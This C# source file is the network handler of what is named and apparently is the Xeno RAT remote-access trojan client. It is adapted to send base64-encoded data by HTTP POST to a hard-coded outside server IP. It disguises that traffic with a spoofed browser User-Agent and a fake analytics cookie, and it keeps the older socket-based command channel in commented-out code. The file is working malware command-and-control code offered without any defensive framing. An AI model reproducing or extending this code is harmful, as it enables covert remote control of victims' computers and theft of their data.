﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Http;
using System.Windows.Forms;
using Newtonsoft.Json;

namespace xeno_rat_client
{
    class header
    {
        public bool Compressed = false;
        public int OriginalFileSize;
        public int T_offset = 1;
    }
    public class SocketHandler
    {
        public Socket sock;
        public HttpClient httpClient;
        public byte[] lastResponse;
        public byte[] EncryptionKey;
        private int socktimeout = 0;
        public SocketHandler(Socket socket, byte[] _EncryptionKey)
        {
            sock = socket;
            if (null != sock)
            {
                sock.NoDelay = true;
            }
            EncryptionKey = _EncryptionKey;
            httpClient = new HttpClient();
        }

        private async Task<byte[]> RecvAllAsync_ddos_unsafer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            DateTime startTimestamp = DateTime.Now;
            DateTime lastSendTime = DateTime.Now; // Initialize the last send time

            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }

                int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                if (recv == 0)
                {
                    data = null;
                    break;
                }

                total += recv;
                dataLeft -= recv;
            }

            return data;
        }


        private async Task<byte[]> RecvAllAsync_ddos_safer(int size)
        {
            byte[] data = new byte[size];
            int total = 0;
            int dataLeft = size;
            DateTime startTimestamp = DateTime.Now;
            DateTime lastSendTime = DateTime.Now; // Initialize the last send time

            while (total < size)
            {
                if (!sock.Connected)
                {
                    return null;
                }
                int availableBytes = sock.Available;

                if (availableBytes > 0)
                {
                    int recv = await sock.ReceiveAsync(new ArraySegment<byte>(data, total, dataLeft), SocketFlags.None);

                    if (recv == 0)
                    {
                        data = null;
                        break;
                    }

                    total += recv;
                    dataLeft -= recv;
                }
                else
                {
                    if (socktimeout != 0)
                    {
                        TimeSpan elapsed = DateTime.Now - startTimestamp;
                        if (elapsed.TotalMilliseconds >= socktimeout)
                        {
                            // Timeout reached, handle accordingly
                            data = null;
                            break;
                        }
                    }

                    TimeSpan timeSinceLastSend = DateTime.Now - lastSendTime;

                    if (timeSinceLastSend.TotalMilliseconds >= 1500) // Check if 1 and a half second has passed
                    {
                        await sock.SendAsync(new ArraySegment<byte>(new byte[] { 1, 0, 0, 0, 2 }), SocketFlags.None);
                        lastSendTime = DateTime.Now; // Update the last send time
                    }

                    // Wait a short period before checking again to avoid busy waiting.
                    await Task.Delay(10);
                }
            }

            return data;
        }

        public static byte[] Concat(byte[] b1, byte[] b2)
        {
            if (b1 == null) b1 = new byte[] { };
            List<byte[]> d = new List<byte[]>();
            d.Add(b1);
            d.Add(b2);
            return d.SelectMany(a => a).ToArray();
        }
        private header ParseHeader(byte[] data)
        {
            header Header = new header();
            if (data[0] == 1)
            {
                Header.Compressed = true;
                Header.OriginalFileSize = BytesToInt(data, 1);
                Header.T_offset = 5;
            }
            else if (data[0] != 0)
            {
                return null;
            }
            return Header;
        }
        public byte[] BTruncate(byte[] bytes, int offset)
        {
            byte[] T_data = new byte[bytes.Length - offset];
            Buffer.BlockCopy(bytes, offset, T_data, 0, T_data.Length);
            return T_data;
        }
        // 0是建立连接，1是正式请求
        public async Task<bool> SendAsync(byte[] data, int type = 1)
        {
            if (data == null)
            {
                throw new ArgumentNullException(nameof(data), "data can not be null!");
            }
            try
            {
                // TODO修改IP
                var requestUrl = "http://154.91.65.162:8080/api/connect";
                //var requestUrl = "http://127.0.0.1:8080/api/connect";
                var jsonData = new
                {
                    type = type,
                    data = Convert.ToBase64String(data)
                };

                // 将 JSON 数据序列化为字符串
                var jsonString = JsonConvert.SerializeObject(jsonData);

                httpClient.DefaultRequestHeaders.Add("Cookie", "_ga=GA1.1.1224401437.1709954154; _ga_W9PKPGC47Q=GS1.1.1710034903.2.1.1710034926.37.0.0");
                httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36");
                httpClient.DefaultRequestHeaders.Add("Cache-Control", "max-age=0");
                httpClient.DefaultRequestHeaders.Add("Accept", "*/*");

                var response = await httpClient.PostAsync(requestUrl, new StringContent(jsonString, Encoding.UTF8, "application/json"));

                // 检查是否成功
                if (response.IsSuccessStatusCode)
                {
                    MessageBox.Show("send success", "Client.SocketHandler");
                    // 解析响应内容
                    lastResponse = await response.Content.ReadAsByteArrayAsync();
                } else
                {
                    MessageBox.Show("send failed", "Client.SocketHandler");
                }
                return true;

                //byte[] compressedData = Compression.Compress(data);
                //byte didCompress = 0;
                //int orgLen = data.Length;
                //if (compressedData != null && compressedData.Length < orgLen)
                //{
                //    data = compressedData;
                //    didCompress = 1;
                //}
                //byte[] header = new byte[] { didCompress };
                //if (didCompress == 1)
                //{
                //    header = Concat(header, IntToBytes(orgLen));
                //}
                //data = Concat(header, data);
                //data = Encryption.Encrypt(data, EncryptionKey);
                //data = Concat(new byte[] { 3 }, data);//protocol upgrade byte
                //byte[] size = IntToBytes(data.Length);
                //data = Concat(size, data);
                //await sock.SendAsync(new ArraySegment<byte>(data), SocketFlags.None);

                //return true;
            }
            catch (Exception e)
            {
                MessageBox.Show("send exception" + e.Message + e.StackTrace, "Client.SocketHandler");
                return false; // should probably disconnect
            }
        }
        public async Task<byte[]> ReceiveAsync()
        {
            if (this.lastResponse != null)
            {
                byte[] temp = this.lastResponse;
                this.lastResponse = null;
                return temp;
            }
            return null;
            //try
            //{
            //    while (true)
            //    {
            //        byte[] length_data = await RecvAllAsync_ddos_unsafer(4);
            //        if (length_data == null)
            //        {
            //            return null;//disconnect
            //        }
            //        int length = BytesToInt(length_data);
            //        byte[] data = await RecvAllAsync_ddos_unsafer(length);//add checks if the client has disconnected, add it to everything
            //        if (data == null)
            //        {
            //            return null;//disconnect
            //        }

            //        header Header;

            //        if (data[0] == 3)//protocol upgrade
            //        {
            //            data = BTruncate(data, 1);
            //            data = Encryption.Decrypt(data, EncryptionKey);
            //            if (data[0] == 2)
            //            {
            //                continue;
            //            }
            //            Header = ParseHeader(data);
            //            if (Header == null)
            //            {
            //                return null;//disconnect
            //            }
            //            data = BTruncate(data, Header.T_offset);
            //            if (Header.Compressed)
            //            {
            //                data = Compression.Decompress(data, Header.OriginalFileSize);
            //            }
            //            return data;
            //        }
            //        else if (data[0] == 2)
            //        {
            //            continue;
            //        }
                    
            //        Header = ParseHeader(data);
            //        if (Header == null)
            //        {
            //            return null;//disconnect
            //        }
            //        data = BTruncate(data, Header.T_offset);
            //        if (Header.Compressed)
            //        {
            //            data = Compression.Decompress(data, Header.OriginalFileSize);
            //        }
            //        data = Encryption.Decrypt(data, EncryptionKey);
            //        return data;

            //    }
            //}
            //catch
            //{
            //    return null;//disconnect
            //}
        }
        public int BytesToInt(byte[] data, int offset = 0)
        {
            if (BitConverter.IsLittleEndian)
            {
                return data[offset] | data[offset + 1] << 8 | data[offset + 2] << 16 | data[offset + 3] << 24;
            }
            else
            {
                return data[offset + 3] | data[offset + 2] << 8 | data[offset + 1] << 16 | data[offset] << 24;
            }
        }
        public byte[] IntToBytes(int data)
        {
            byte[] bytes = new byte[4];

            if (BitConverter.IsLittleEndian)
            {
                bytes[0] = (byte)data;
                bytes[1] = (byte)(data >> 8);
                bytes[2] = (byte)(data >> 16);
                bytes[3] = (byte)(data >> 24);
            }
            else
            {
                bytes[3] = (byte)data;
                bytes[2] = (byte)(data >> 8);
                bytes[1] = (byte)(data >> 16);
                bytes[0] = (byte)(data >> 24);
            }

            return bytes;
        }


        public void SetRecvTimeout(int ms)
        {
            socktimeout = ms;
            sock.ReceiveTimeout = ms;
        }
        public void ResetRecvTimeout()
        {
            socktimeout = 0;
            sock.ReceiveTimeout = 0;
        }
    }
}
